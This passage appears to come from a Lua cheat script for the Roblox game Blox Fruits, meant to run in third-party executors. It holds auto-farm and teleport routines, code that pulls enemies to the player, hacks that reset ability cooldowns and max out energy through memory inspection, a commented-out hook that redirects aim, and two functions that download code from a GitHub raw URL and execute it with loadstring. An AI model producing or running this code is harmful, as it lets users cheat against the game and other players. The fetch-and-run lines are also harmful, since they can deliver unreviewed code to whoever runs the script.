        'Darkbeard',
        'Cursed Captain',
        'Order'
    }
elseif World3 then
    Boss = {
        'Stone',
        'Hydra Leader',
        'Kilo Admiral',
        'Captain Elephant',
        'Beautiful Pirate',
        'Cake Queen',
        'Longma',
        'Soul Reaper'
    }
end
if World1 then
    MaterialList = {
        'Leather + Scrap Metal',
        'Angel Wings',
        'Magma Ore',
        'Fish Tail'
    }
elseif World2 then
    MaterialList = {
        'Leather + Scrap Metal',
        'Radioactive Material',
        'Ectoplasm',
        'Mystic Droplet',
        'Magma Ore',
        'Vampire Fang'
    }
elseif World3 then
    MaterialList = {
        'Scrap Metal',
        'Demonic Wisp',
        'Conjured Cocoa',
        'Dragon Scale',
        'Gunpowder',
        'Fish Tail',
        'Mini Tusk'
    }
end
local b = {
    'Flame',
    'Ice',
    'Quake',
    'Light',
    'Dark',
    'String',
    'Rumble',
    'Magma',
    'Human: Buddha',
    'Sand',
    'Bird: Phoenix',
    'Dough'
}
local c = {
    'Snow Lurker',
    'Arctic Warrior',
    'Hidden Key',
    'Awakened Ice Admiral'
}
local d = {
    Mob = 'Mythological Pirate',
    Mob2 = 'Cursed Skeleton',
    "Hell's Messenger",
    Mob3 = 'Cursed Skeleton',
    "Heaven's Guardian"
}
local e = {
    'Part',
    'SpawnLocation',
    'Terrain',
    'WedgePart',
    'MeshPart'
}
local f = {
    'Swan Pirate',
    'Jeremy'
}
local g = {
    'Forest Pirate',
    'Captain Elephant'
}
local h = {
    'Fajita',
    'Jeremy',
    'Diamond'
}
local i = {
    'Beast Hunter',
    'Lantern',
    'Guardian',
    'Grand Brigade',
    'Dinghy',
    'Sloop',
    'The Sentinel'
}
local j = {
    'Cookie Crafter'
}
local k = {
    'Reborn Skeleton'
}
local l = {
    ['Pirate Millionaire'] = CFrame.new(- 712.8272705078125, 98.5770492553711, 5711.9541015625),
    ['Pistol Billionaire'] = CFrame.new(- 723.4331665039063, 147.42906188964844, 5931.9931640625),
    ['Dragon Crew Warrior'] = CFrame.new(7021.50439453125, 55.76270294189453, - 730.1290893554688),
    ['Dragon Crew Archer'] = CFrame.new(6625, 378, 244),
    ['Female Islander'] = CFrame.new(4692.7939453125, 797.9766845703125, 858.8480224609375),
    ['Venomous Assailant'] = CFrame.new(4902, 670, 39),
    ['Marine Commodore'] = CFrame.new(2401, 123, - 7589),
    ['Marine Rear Admiral'] = CFrame.new(3588, 229, - 7085),
    ['Fishman Raider'] = CFrame.new(- 10941, 332, - 8760),
    ['Fishman Captain'] = CFrame.new(- 11035, 332, - 9087),
    ['Forest Pirate'] = CFrame.new(- 13446, 413, - 7760),
    ['Mythological Pirate'] = CFrame.new(- 13510, 584, - 6987),
    ['Jungle Pirate'] = CFrame.new(- 11778, 426, - 10592),
    ['Musketeer Pirate'] = CFrame.new(- 13282, 496, - 9565),
    ['Reborn Skeleton'] = CFrame.new(- 8764, 142, 5963),
    ['Living Zombie'] = CFrame.new(- 10227, 421, 6161),
    ['Demonic Soul'] = CFrame.new(- 9579, 6, 6194),
    ['Posessed Mummy'] = CFrame.new(- 9579, 6, 6194),
    ['Peanut Scout'] = CFrame.new(- 1993, 187, - 10103),
    ['Peanut President'] = CFrame.new(- 2215, 159, - 10474),
    ['Ice Cream Chef'] = CFrame.new(- 877, 118, - 11032),
    ['Ice Cream Commander'] = CFrame.new(- 877, 118, - 11032),
    ['Cookie Crafter'] = CFrame.new(- 2021, 38, - 12028),
    ['Cake Guard'] = CFrame.new(- 2024, 38, - 12026),
    ['Baking Staff'] = CFrame.new(- 1932, 38, - 12848),
    ['Head Baker'] = CFrame.new(- 1932, 38, - 12848),
    ['Cocoa Warrior'] = CFrame.new(95, 73, - 12309),
    ['Chocolate Bar Battler'] = CFrame.new(647, 42, - 12401),
    ['Sweet Thief'] = CFrame.new(116, 36, - 12478),
    ['Candy Rebel'] = CFrame.new(47, 61, - 12889),
    Ghost = CFrame.new(5251, 5, 1111)
}
EquipWeapon = function(m)
    if not m then
        return
    end
    if plr.Backpack:FindFirstChild(m) then
        plr.Character.Humanoid:EquipTool(plr.Backpack:FindFirstChild(m))
    end
end
weaponSc = function(m)
    for n, o in pairs(plr.Backpack:GetChildren()) do
        if o:IsA('Tool') then
            if o.ToolTip == m then
                EquipWeapon(o.Name)
            end
        end
    end
end
local m = {}
m.__index = m
m.Alive = function(n)
    if not n then
        return
    end
    local o = n:FindFirstChild('Humanoid')
    return o and o.Health > 0
end
m.Pos = function(n, o)
    return (Root.Position - mode.Position).Magnitude <= o
end
m.Dist = function(n, o)
    return (Root.Position - n:FindFirstChild('HumanoidRootPart').Position).Magnitude <= o
end
m.DistH = function(n, o)
    return (Root.Position - n:FindFirstChild('HumanoidRootPart').Position).Magnitude > o
end
local posX, posY, posZ = 0, 30, 0
m.Kill = function(n, o)
    if n and o then
        if not n:GetAttribute('Locked') then
            n:SetAttribute('Locked', n.HumanoidRootPart.CFrame)
        end
        PosMon = n:GetAttribute('Locked').Position
        BringEnemy()
        EquipWeapon(_G.SelectWeapon)
        local p = game.Players.LocalPlayer.Character:FindFirstChildOfClass('Tool')
        local q = p.ToolTip
        if q == 'Blox Fruit' then
            _tp(n.HumanoidRootPart.CFrame * CFrame.new(0, 10, 0) * CFrame.Angles(0, math.rad(90), 0))
        else
            _tp(n.HumanoidRootPart.CFrame * CFrame.new(posX, posY, posZ) * CFrame.Angles(0, math.rad(180), 0))
        end
       
        if RandomCFrame then
            wait(0.1)
            _tp(n.HumanoidRootPart.CFrame * CFrame.new(0, 30, 25))
            wait(0.1)
            _tp(n.HumanoidRootPart.CFrame * CFrame.new(25, 30, 0))
            wait(0.1)
            _tp(n.HumanoidRootPart.CFrame * CFrame.new(- 25, 30, 0))
            wait(0.1)
            _tp(n.HumanoidRootPart.CFrame * CFrame.new(0, 30, 25))
            wait(0.1)
            _tp(n.HumanoidRootPart.CFrame * CFrame.new(- 25, 30, 0))
        end

        local executor = string.lower(identifyexecutor())
        if  (string.find(executor, "xeno") or string.find(executor, "solara")) then
            shitexecattack()
        else
            AttackNoCoolDown()
        end

    end
end
m.Kill2 = function(n, o)
    if n and o then
        if not n:GetAttribute('Locked') then
            n:SetAttribute('Locked', n.HumanoidRootPart.CFrame)
        end
        PosMon = n:GetAttribute('Locked').Position
        BringEnemy()
        EquipWeapon(_G.SelectWeapon)
        local p = game.Players.LocalPlayer.Character:FindFirstChildOfClass('Tool')
        local q = p.ToolTip
        if q == 'Blox Fruit' then
            _tp(n.HumanoidRootPart.CFrame * CFrame.new(0, 10, 0) * CFrame.Angles(0, math.rad(90), 0))
        else
            _tp(n.HumanoidRootPart.CFrame * CFrame.new(0, 30, 8) * CFrame.Angles(0, math.rad(180), 0))
        end
        if RandomCFrame then
            wait(0.1)
            _tp(n.HumanoidRootPart.CFrame * CFrame.new(0, 30, 25))
            wait(0.1)
            _tp(n.HumanoidRootPart.CFrame * CFrame.new(25, 30, 0))
            wait(0.1)
            _tp(n.HumanoidRootPart.CFrame * CFrame.new(- 25, 30, 0))
            wait(0.1)
            _tp(n.HumanoidRootPart.CFrame * CFrame.new(0, 30, 25))
            wait(0.1)
            _tp(n.HumanoidRootPart.CFrame * CFrame.new(- 25, 30, 0))
        end

        local executor = string.lower(identifyexecutor())
        if  (string.find(executor, "xeno") or string.find(executor, "solara")) then
            shitexecattack()
        else
            AttackNoCoolDown()
        end
    end
end
m.KillSea = function(n, o)
    if n and o then
        if not n:GetAttribute('Locked') then
            n:SetAttribute('Locked', n.HumanoidRootPart.CFrame)
        end
        PosMon = n:GetAttribute('Locked').Position
        BringEnemy()
        EquipWeapon(_G.SelectWeapon)
        local p = game.Players.LocalPlayer.Character:FindFirstChildOfClass('Tool')
        local q = p.ToolTip
        if q == 'Blox Fruit' then
            _tp(n.HumanoidRootPart.CFrame * CFrame.new(0, 10, 0) * CFrame.Angles(0, math.rad(90), 0))
        else
            notween(n.HumanoidRootPart.CFrame * CFrame.new(0, 50, 8))
            wait(0.85)
            notween(n.HumanoidRootPart.CFrame * CFrame.new(0, 400, 0))
            wait(1)
        end

        local executor = string.lower(identifyexecutor())
        if  (string.find(executor, "xeno") or string.find(executor, "solara")) then
            shitexecattack()
        else
            AttackNoCoolDown()
        end

    end
end
m.Sword = function(n, o)
    if n and o then
        if not n:GetAttribute('Locked') then
            n:SetAttribute('Locked', n.HumanoidRootPart.CFrame)
        end
        PosMon = n:GetAttribute('Locked').Position
        BringEnemy()
        weaponSc('Sword')
        _tp(n.HumanoidRootPart.CFrame * CFrame.new(posX, posY, posZ))
        if RandomCFrame then
            wait(0.1)
            _tp(n.HumanoidRootPart.CFrame * CFrame.new(0, 30, 25))
            wait(0.1)
            _tp(n.HumanoidRootPart.CFrame * CFrame.new(25, 30, 0))
            wait(0.1)
            _tp(n.HumanoidRootPart.CFrame * CFrame.new(- 25, 30, 0))
            wait(0.1)
            _tp(n.HumanoidRootPart.CFrame * CFrame.new(0, 30, 25))
            wait(0.1)
            _tp(n.HumanoidRootPart.CFrame * CFrame.new(- 25, 30, 0))
        end

        local executor = string.lower(identifyexecutor())
        if  (string.find(executor, "xeno") or string.find(executor, "solara")) then
            shitexecattack()
        else
            AttackNoCoolDown()
        end

    end
end
m.Mas = function(n, o)
    if n and o then
        if not n:GetAttribute('Locked') then
            n:SetAttribute('Locked', n.HumanoidRootPart.CFrame)
        end
        PosMon = n:GetAttribute('Locked').Position
        BringEnemy()
        if n.Humanoid.Health <= HealthM then
            _tp(n.HumanoidRootPart.CFrame * CFrame.new(0, 20, 0))
            Useskills('Blox Fruit', 'Z')
            Useskills('Blox Fruit', 'X')
            Useskills('Blox Fruit', 'C')
        else
            weaponSc('Melee')
            _tp(n.HumanoidRootPart.CFrame * CFrame.new(0, 30, 0))
        end
    end
end
m.Masgun = function(n, o)
    if n and o then
        if not n:GetAttribute('Locked') then
            n:SetAttribute('Locked', n.HumanoidRootPart.CFrame)
        end
        PosMon = n:GetAttribute('Locked').Position
        BringEnemy()
        if n.Humanoid.Health <= HealthM then
            _tp(n.HumanoidRootPart.CFrame * CFrame.new(0, 35, 8))
            Useskills('Gun', 'Z')
            Useskills('Gun', 'X')
        else
            weaponSc('Melee')
            _tp(n.HumanoidRootPart.CFrame * CFrame.new(0, 30, 0))
        end
    end
end
statsSetings = function(n, o)
    if n == 'Melee' then
        if plr.Data.Points.Value ~= 0 then
            replicated.Remotes.CommF_:InvokeServer('AddPoint', 'Melee', o)
        end
    elseif n == 'Defense' then
        if plr.Data.Points.Value ~= 0 then
            replicated.Remotes.CommF_:InvokeServer('AddPoint', 'Defense', o)
        end
    elseif n == 'Sword' then
        if plr.Data.Points.Value ~= 0 then
            replicated.Remotes.CommF_:InvokeServer('AddPoint', 'Sword', o)
        end
    elseif n == 'Gun' then
        if plr.Data.Points.Value ~= 0 then
            replicated.Remotes.CommF_:InvokeServer('AddPoint', 'Gun', o)
        end
    elseif n == 'Devil' then
        if plr.Data.Points.Value ~= 0 then
            replicated.Remotes.CommF_:InvokeServer('AddPoint', 'Demon Fruit', o)
        end
    end
end
BringEnemy = function()
    if not _B then
        return
    end
    for n, o in pairs(workspace.Enemies:GetChildren()) do
        if setscriptable then
            setscriptable(game.Players.LocalPlayer, 'SimulationRadius', true)
        end
        if sethiddenproperty then
            sethiddenproperty(game.Players.LocalPlayer, 'SimulationRadius', math.huge)
        end
        local p = game.Players.LocalPlayer
        local q = (p.Character or p.CharacterAdded()):WaitForChild('HumanoidRootPart')
        local r = o:FindFirstChild('HumanoidRootPart')
        local s = o:FindFirstChild('Humanoid')
        if r:FindFirstChild('BodyVelocity') then
            r:FindFirstChild('BodyVelocity'):Destroy()
        end
        if r:FindFirstChild('BodyPosition') then
            r:FindFirstChild('BodyPosition'):Destroy()
        end
        s.WalkSpeed = 0
        s.JumpPower = 0
        local t = r:FindFirstChild('Solix_BRINGMOB')
        if not t then
            t = Instance.new('BodyVelocity', r)
            t.Name = 'Solix_BRINGMOB'
            t.Velocity = Vector3.zero
            t.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
            t.P = 1000
        end
        if (r.Position - q.Position).Magnitude <= 275 then
            if (PosMon - r.Position).Magnitude >= 50 then
                t.Velocity = (PosMon - r.Position).Unit * 250
            else
                r.CFrame = CFrame.new(PosMon)
                t.Velocity = Vector3.zero
                r.CanCollide = false
                if r.Parent:FindFirstChild('UpperTorso') then
                    r.Parent:FindFirstChild('UpperTorso').CanCollide = false
                end
                if r.Parent:FindFirstChild('Head') then
                    r.Parent:FindFirstChild('Head').CanCollide = false
                end
            end
        else
            t.Velocity = Vector3.zero
        end
        if not table.find(BringConnections, s) then
            table.insert(BringConnections, s)
            s:GetPropertyChangedSignal('Health'):Connect(function()
                if s.Health <= 0 then
                    t:Destroy()
                end
            end)
            s.Destroying:Connect(function()
                table.remove(BringConnections, table.find(BringConnections, s))
            end)
        end
    end
end
Useskills = function(n, o)
    if n == 'Melee' then
        weaponSc('Melee')
        if o == 'Z' then
            vim1:SendKeyEvent(true, 'Z', false, game)
            vim1:SendKeyEvent(false, 'Z', false, game)
        elseif o == 'X' then
            vim1:SendKeyEvent(true, 'X', false, game)
            vim1:SendKeyEvent(false, 'X', false, game)
        elseif o == 'C' then
            vim1:SendKeyEvent(true, 'C', false, game)
            vim1:SendKeyEvent(false, 'C', false, game)
        end
    elseif n == 'Sword' then
        weaponSc('Sword')
        if o == 'Z' then
            vim1:SendKeyEvent(true, 'Z', false, game)
            vim1:SendKeyEvent(false, 'Z', false, game)
        elseif o == 'X' then
            vim1:SendKeyEvent(true, 'X', false, game)
            vim1:SendKeyEvent(false, 'X', false, game)
        end
    elseif n == 'Blox Fruit' then
        weaponSc('Blox Fruit')
        if o == 'Z' then
            vim1:SendKeyEvent(true, 'Z', false, game)
            vim1:SendKeyEvent(false, 'Z', false, game)
        elseif o == 'X' then
            vim1:SendKeyEvent(true, 'X', false, game)
            vim1:SendKeyEvent(false, 'X', false, game)
        elseif o == 'C' then
            vim1:SendKeyEvent(true, 'C', false, game)
            vim1:SendKeyEvent(false, 'C', false, game)
        elseif o == 'V' then
            vim1:SendKeyEvent(true, 'V', false, game)
            vim1:SendKeyEvent(false, 'V', false, game)
        end
    elseif n == 'Gun' then
        weaponSc('Gun')
        if o == 'Z' then
            vim1:SendKeyEvent(true, 'Z', false, game)
            vim1:SendKeyEvent(false, 'Z', false, game)
        elseif o == 'X' then
            vim1:SendKeyEvent(true, 'X', false, game)
            vim1:SendKeyEvent(false, 'X', false, game)
        end
    end
    if n == 'nil' and o == 'Y' then
        vim1:SendKeyEvent(true, 'Y', false, game)
        vim1:SendKeyEvent(false, 'Y', false, game)
    end
end

--[[
local n = game.Players.LocalPlayer:GetMouse()
Cac = hookmetamethod(game, '__index', newcclosure(function(o, p)
    if o == n then
        if p == 'Hit' or p == 'hit' then
            if (_G.FarmMastery_G and not SoulGuitar) or (_G.FarmMastery_Dev) or (_G.FarmBlazeEM) or (_G.Prehis_Skills) or (_G.SeaBeast1 or _G.FishBoat or _G.PGB or _G.Leviathan1 or _G.Complete_Trials) or (_G.AimMethod and ABmethod == 'AimBots Skill') or (_G.AimMethod and ABmethod == 'Auto Aimbots') then
                return CFrame.new(MousePos)
            end
        end
    end
    return Cac(o, p)
end))
local o = getrawmetatable(game)
local p = o.__namecall
setreadonly(o, false)
o.__namecall = newcclosure(function(...)
    local q = getnamecallmethod()
    local r = {
        ...
    }
    if tostring(q) == 'FireServer' then
        if tostring(r[1]) == 'RemoteEvent' then
            if tostring(r[2]) ~= 'true' and tostring(r[2]) ~= 'false' then
                if (_G.FarmMastery_G and not SoulGuitar) or (_G.FarmMastery_Dev) or (_G.FarmBlazeEM) or (_G.Prehis_Skills) or (_G.SeaBeast1 or _G.FishBoat or _G.PGB or _G.Leviathan1 or _G.Complete_Trials) or (_G.AimMethod and ABmethod == 'AimBots Skill') or (_G.AimMethod and ABmethod == 'Auto Aimbots') then
                    r[2] = MousePos
                    return p(unpack(r))
                end
            end
        end
    end
    return p(...)
end)
]]
GetConnectionEnemies = function(q)
    local r = nil
    local s = math.huge
    local function checkEnemy(t)
        if t:IsA('Model') and ((typeof(q) == 'table' and table.find(q, t.Name)) or t.Name == q) and t:FindFirstChild('Humanoid') and t.Humanoid.Health > 0 and t:FindFirstChild('HumanoidRootPart') then
            local u = (t.HumanoidRootPart.Position - Root.Position).Magnitude
            if u < s then
                s = u
                r = t
            end
        end
    end
    for t, u in pairs(replicated:GetChildren()) do
        checkEnemy(u)
    end
    for t, u in pairs(game.Workspace.Enemies:GetChildren()) do
        checkEnemy(u)
    end
    return r
end
LowCpu = function()
    local q = true
    local r = game
    local s = r.Workspace
    local t = r.Lighting
    local u = s.Terrain
    u.WaterWaveSize = 0
    u.WaterWaveSpeed = 0
    u.WaterReflectance = 0
    u.WaterTransparency = 0
    t.GlobalShadows = false
    t.FogEnd = 9e9
    t.Brightness = 0
    settings().Rendering.QualityLevel = 'Level01'
    for v, w in pairs(r:GetDescendants()) do
        if w:IsA('Part') or w:IsA('Union') or w:IsA('CornerWedgePart') or w:IsA('TrussPart') then
            w.Material = 'Plastic'
            w.Reflectance = 0
        elseif w:IsA('Decal') or w:IsA('Texture') and q then
            w.Transparency = 1
        elseif w:IsA('ParticleEmitter') or w:IsA('Trail') then
            w.Lifetime = NumberRange.new(0)
        elseif w:IsA('Explosion') then
            w.BlastPressure = 1
            w.BlastRadius = 1
        elseif w:IsA('Fire') or w:IsA('SpotLight') or w:IsA('Smoke') or w:IsA('Sparkles') then
            w.Enabled = false
        elseif w:IsA('MeshPart') then
            w.Material = 'Plastic'
            w.Reflectance = 0
            w.TextureID = 10385902758728956
        end
    end
    for v, w in pairs(t:GetChildren()) do
        if w:IsA('BlurEffect') or w:IsA('SunRaysEffect') or w:IsA('ColorCorrectionEffect') or w:IsA('BloomEffect') or w:IsA('DepthOfFieldEffect') then
            w.Enabled = false
        end
    end
end
CheckF = function()
    if GetBP('Dragon-Dragon') or GetBP('Gas-Gas') or GetBP('Yeti-Yeti') or GetBP('Kitsune-Kitsune') or GetBP('T-Rex-T-Rex') then
        return true
    end
end
CheckBoat = function()
    for q, r in pairs(workspace.Boats:GetChildren()) do
        if tostring(r.Owner.Value) == tostring(plr.Name) then
            return r
        end
    end
    return false
end
CheckEnemiesBoat = function()
    for q, r in pairs(workspace.Enemies:GetChildren()) do
        if (r.Name == 'FishBoat') and r:FindFirstChild('Health').Value > 0 then
            return true
        end
    end
    return false
end
CheckPirateGrandBrigade = function()
    for q, r in pairs(workspace.Enemies:GetChildren()) do
        if (r.Name == 'PirateGrandBrigade' or r.Name == 'PirateBrigade') and r:FindFirstChild('Health').Value > 0 then
            return true
        end
    end
    return false
end
CheckShark = function()
    for q, r in pairs(workspace.Enemies:GetChildren()) do
        if r.Name == 'Shark' and m.Alive(r) then
            return true
        end
    end
    return false
end
CheckTerrorShark = function()
    for q, r in pairs(workspace.Enemies:GetChildren()) do
        if r.Name == 'Terrorshark' and m.Alive(r) then
            return true
        end
    end
    return false
end
CheckPiranha = function()
    for q, r in pairs(workspace.Enemies:GetChildren()) do
        if r.Name == 'Piranha' and m.Alive(r) then
            return true
        end
    end
    return false
end
CheckFishCrew = function()
    for q, r in pairs(workspace.Enemies:GetChildren()) do
        if (r.Name == 'Fish Crew Member' or r.Name == 'Haunted Crew Member') and m.Alive(r) then
            return true
        end
    end
    return false
end
CheckSeaBeast = function()
    if workspace.SeaBeasts:FindFirstChild('SeaBeast1') then
        return true
    end
    return false
end
CheckLeviathan = function()
    if workspace.SeaBeasts:FindFirstChild('Leviathan') then
        return true
    end
    return false
end
UpdStFruit = function()
    for q, r in next, plr.Backpack:GetChildren() do
        StoreFruit = r:FindFirstChild('EatRemote', true)
        if StoreFruit then
            replicated.Remotes.CommF_:InvokeServer('StoreFruit', StoreFruit.Parent:GetAttribute('OriginalName'), plr.Backpack:FindFirstChild(r.Name))
        end
    end
end
collectFruits = function(q)
    if q then
        local r = plr.Character
        for s, t in pairs(workspace:GetChildren()) do
            if string.find(t.Name, 'Fruit') then
                t.Handle.CFrame = r.HumanoidRootPart.CFrame
            end
        end
    end
end
Getmoon = function()
    if World1 then
        return Lighting.FantasySky.MoonTextureId
    elseif World2 then
        return Lighting.FantasySky.MoonTextureId
    elseif World3 then
        return Lighting.Sky.MoonTextureId
    end
end
DropFruits = function()
    for q, r in next, plr.Backpack:GetChildren() do
        if string.find(r.Name, 'Fruit') then
            EquipWeapon(r.Name)
            wait(0.1)
            if plr.PlayerGui.Main.Dialogue.Visible == true then
                plr.PlayerGui.Main.Dialogue.Visible = false
            end
            EquipWeapon(r.Name)
            plr.Character:FindFirstChild(r.Name).EatRemote:InvokeServer('Drop')
        end
    end
    for q, r in pairs(plr.Character:GetChildren()) do
        if string.find(r.Name, 'Fruit') then
            EquipWeapon(r.Name)
            wait(0.1)
            if plr.PlayerGui.Main.Dialogue.Visible == true then
                plr.PlayerGui.Main.Dialogue.Visible = false
            end
            EquipWeapon(r.Name)
            plr.Character:FindFirstChild(r.Name).EatRemote:InvokeServer('Drop')
        end
    end
end
GetBP = function(q)
    return plr.Backpack:FindFirstChild(q) or plr.Character:FindFirstChild(q)
end
GetIn = function(q)
    for r, s in pairs(replicated.Remotes.CommF_:InvokeServer('getInventory')) do
        if type(s) == 'table' then
            if s.Name == q or plr.Character:FindFirstChild(q) or plr.Backpack:FindFirstChild(q) then
                return true
            end
        end
    end
    return false
end
GetM = function(q)
    for r, s in pairs(replicated.Remotes.CommF_:InvokeServer('getInventory')) do
        if type(s) == 'table' then
            if s.Type == 'Material' then
                if s.Name == q then
                    return s.Count
                end
            end
        end
    end
    return 0
end
GetWP = function(q)
    for r, s in pairs(replicated.Remotes.CommF_:InvokeServer('getInventory')) do
        if type(s) == 'table' then
            if s.Type == 'Sword' then
                if s.Name == q or plr.Character:FindFirstChild(q) or plr.Backpack:FindFirstChild(q) then
                    return true
                end
            end
        end
    end
    return false
end
getInfinity_Ability = function(q, r)
    if not Root then
        return
    end
    if q == 'Soru' and r then
        for s, t in next, getgc() do
            if plr.Character.Soru then
                if ((typeof(t) == 'function') and (getfenv(t).script == plr.Character.Soru)) then
                    for u, v in next, getupvalues(t) do
                        if (typeof(v) == 'table') then
                            repeat
                                wait(Sec)
                                v.LastUse = 0
                            until not r or (plr.Character.Humanoid.Health <= 0)
                        end
                    end
                end
            end
        end
    elseif q == 'Energy' and r then
        plr.Character.Energy.Changed:connect(function()
            if r then
                plr.Character.Energy.Value = Energy
            end
        end)
    elseif q == 'Observation' and r then
        local s = plr.VisionRadius
        s.Value = math.huge
    end
end
Hop = function()
    pcall(function()
        for q = math.random(1, math.random(40, 75)), 100 do
            local r = replicated.__ServerBrowser:InvokeServer(q)
            for s, t in next, r do
                if tonumber(t.Count) < 12 then
                    TeleportService:TeleportToPlaceInstance(game.PlaceId, s)
                end
            end
        end
    end)
end
local q = Instance.new('Part', workspace)
q.Size = Vector3.new(1, 1, 1)
q.Name = 'Rip_Indra'
q.Anchored = true
q.CanCollide = false
q.CanTouch = false
q.Transparency = 1
local r = workspace:FindFirstChild(q.Name)
if r and r ~= q then
    r:Destroy()
end
task.spawn(function()
    while task.wait() do
        if q and q.Parent == workspace then
            if shouldTween then
                getgenv().OnFarm = true
            else
                getgenv().OnFarm = false
            end
        else
            getgenv().OnFarm = false
        end
    end
end)
task.spawn(function()
    local s = game.Players.LocalPlayer
    repeat
        task.wait()
    until s.Character and s.Character.PrimaryPart
    q.CFrame = s.Character.PrimaryPart.CFrame
    while task.wait() do
        pcall(function()
            if getgenv().OnFarm then
                if q and q.Parent == workspace then
                    local t = s.Character and s.Character.PrimaryPart
                    if t and (t.Position - q.Position).Magnitude <= 200 then
                        t.CFrame = q.CFrame
                    else
                        q.CFrame = t.CFrame
                    end
                end
                local t = s.Character
                if t then
                    for u, v in pairs(t:GetChildren()) do
                        if v:IsA('BasePart') then
                            v.CanCollide = false
                        end
                    end
                end
            else
                local t = s.Character
                if t then
                    for u, v in pairs(t:GetChildren()) do
                        if v:IsA('BasePart') then
                            v.CanCollide = true
                        end
                    end
                end
            end
        end)
    end
end)
_tp = function(s)
    local t = plr.Character
    if not t or not t:FindFirstChild('HumanoidRootPart') then
        return
    end
    local u = t.HumanoidRootPart
    local v = (s.Position - u.Position).Magnitude
    local w = TweenInfo.new(v / 300, Enum.EasingStyle.Linear)
    local x = game:GetService('TweenService'):Create(q, w, {
        CFrame = s
    })
    if _G.Y_Position then
        Root.CFrame = CFrame.new(Root.CFrame.X, s.Y, Root.CFrame.Z)
    end
    if plr.Character.Humanoid.Sit == true then
        q.CFrame = CFrame.new(q.Position.X, s.Y, q.Position.Z)
    end
    x:Play()
    task.spawn(function()
        while x.PlaybackState == Enum.PlaybackState.Playing do
            if not shouldTween then
                x:Cancel()
                break
            end
            task.wait(0.1)
        end
    end)
end
TeleportToTarget = function(s)
    if (s.Position - plr.Character.HumanoidRootPart.Position).Magnitude > 1000 then
        _tp(s)
    else
        _tp(s)
    end
end
notween = function(s)
    plr.Character.HumanoidRootPart.CFrame = s
end
BTP = function(s)
    Root.CFrame = s
    plr.Character.Humanoid.Health = 0
    Root.CFrame = s
end
spawn(function()
    while task.wait() do
        pcall(function()
            if _G.AutoRipInSpawn or _G.SailBoat_Hydra or _G.WardenBoss or _G.AutoFactory or _G.HighestMirage or _G.PGB or _G.Leviathan1 or _G.UPGDrago or _G.Complete_Trials or _G.TpDrago_Prehis or _G.BuyDrago or _G.AutoFireFlowers or _G.DT_Uzoth or _G.AutoBerry or _G.Prehis_Find or _G.Prehis_Skills or _G.Prehis_DB or _G.Prehis_DE or _G.FarmBlazeEM or _G.Dojoo or _G.CollectPresent or _G.AutoLawKak or _G.TpLab or _G.AutoPhoenixF or _G.AutoFarmChest or _G.AutoHytHallow or _G.LongsWord or _G.BlackSpikey or _G.AutoHolyTorch or _G.TrainDrago or _G.AutoSaber or _G.FarmMastery_Dev or _G.CitizenQuest or _G.AutoEctoplasm or _G.KeysRen or _G.Auto_Rainbow_Haki or _G.obsFarm or _G.AutoBigmom or _G.Doughv2 or _G.AuraBoss or _G.Raiding or _G.Auto_Cavender or _G.TpPly or _G.Bartilo_Quest or _G.Level or _G.FarmEliteHunt or _G.AutoZou or _G.AutoFarm_Bone or getgenv().AutoMaterial or _G.CraftVM or _G.FrozenTP or _G.TPDoor or _G.AcientOne or _G.AutoFarmNear or _G.AutoRaidCastle or _G.DarkBladev3 or _G.AutoFarmRaid or _G.Auto_Cake_Prince or _G.Addealer or _G.TPNpc or _G.TwinHook or _G.FindMirage or _G.FarmChestM or _G.Shark or _G.TerrorShark or _G.Piranha or _G.MobCrew or _G.SeaBeast1 or _G.FishBoat or _G.AutoPole or _G.AutoPoleV2 or _G.Auto_SuperHuman or _G.AutoDeathStep or _G.Auto_SharkMan_Karate or _G.Auto_Electric_Claw or _G.AutoDragonTalon or _G.Auto_Def_DarkCoat or _G.Auto_God_Human or _G.Auto_Tushita or _G.AutoMatSoul or _G.AutoKenVTWO or _G.AutoSerpentBow or _G.AutoFMon or _G.Auto_Soul_Guitar or _G.TPGEAR or _G.AutoSaw or _G.AutoTridentW2 or _G.Auto_StartRaid or _G.AutoEvoRace or _G.AutoGetQuestBounty or _G.MarinesCoat or _G.TravelDres or _G.Defeating or _G.DummyMan or _G.Auto_Yama or _G.Auto_SwanGG or _G.SwanCoat or _G.AutoEcBoss or _G.Auto_Mink or _G.Auto_Human or _G.Auto_Skypiea or _G.Auto_Fish or _G.CDK_TS or _G.CDK_YM or _G.CDK or _G.AutoFarmGodChalice or _G.AutoFistDarkness or _G.AutoMiror or _G.Teleport or _G.AutoKilo or _G.AutoGetUsoap or _G.Praying or _G.TryLucky or _G.AutoColShad or _G.AutoUnHaki or _G.Auto_DonAcces or _G.AutoRipIngay or _G.DragoV3 or _G.DragoV1 or _G.SailBoats or NextIs or _G.FarmGodChalice or _G.IceBossRen or senth or senth2 or _G.Lvthan or _G.beasthunter or _G.DangerLV or _G.Relic123 or _G.tweenKitsune or _G.Collect_Ember or _G.AutofindKitIs or _G.snaguine or _G.TwFruits or _G.tweenKitShrine or _G.Tp_LgS or _G.Tp_MasterA or _G.tweenShrine or _G.FarmMastery_G or _G.FarmMastery_S then
                shouldTween = true
                if not plr.Character.HumanoidRootPart:FindFirstChild('BodyClip') then
                    local s = Instance.new('BodyVelocity')
                    s.Name = 'BodyClip'
                    s.Parent = plr.Character.HumanoidRootPart
                    s.MaxForce = Vector3.new(100000, 100000, 100000)
                    s.Velocity = Vector3.new(0, 0, 0)
                end
               
                for s, t in pairs(plr.Character:GetDescendants()) do
                    if t:IsA('BasePart') then
                        t.CanCollide = false
                    end
                end
            else
                shouldTween = false
                if plr.Character.HumanoidRootPart:FindFirstChild('BodyClip') then
                    plr.Character.HumanoidRootPart:FindFirstChild('BodyClip'):Destroy()
                end
            end
        end)
    end
end)
QuestB = function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Ifykyklolololol/quests/refs/heads/main/bossquests"))() 
    
end
QuestBeta = function()
    local s = QuestB()
    return {
        [0] = _G.FindBoss,
        [1] = bMon,
        [2] = Qdata,
        [3] = Qname,
        [4] = PosB
    }
end
QuestCheck = function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Ifykyklolololol/quests/refs/heads/main/questslist"))() 
end
MaterialMon = function()
    local s = game.Players.LocalPlayer
    local t = s.Character and s.Character:FindFirstChild('HumanoidRootPart')
    if not t then
        return
    end
    shouldRequestEntrance = function(u, v)
        local w = (t.Position - u).Magnitude
        if w >= v then
            replicated.Remotes.CommF_:InvokeServer('requestEntrance', u)
        end
    end
    if World1 then
        if SelectMaterial == 'Angel Wings' then
            MMon = {
                'Shanda',
                'Royal Squad',
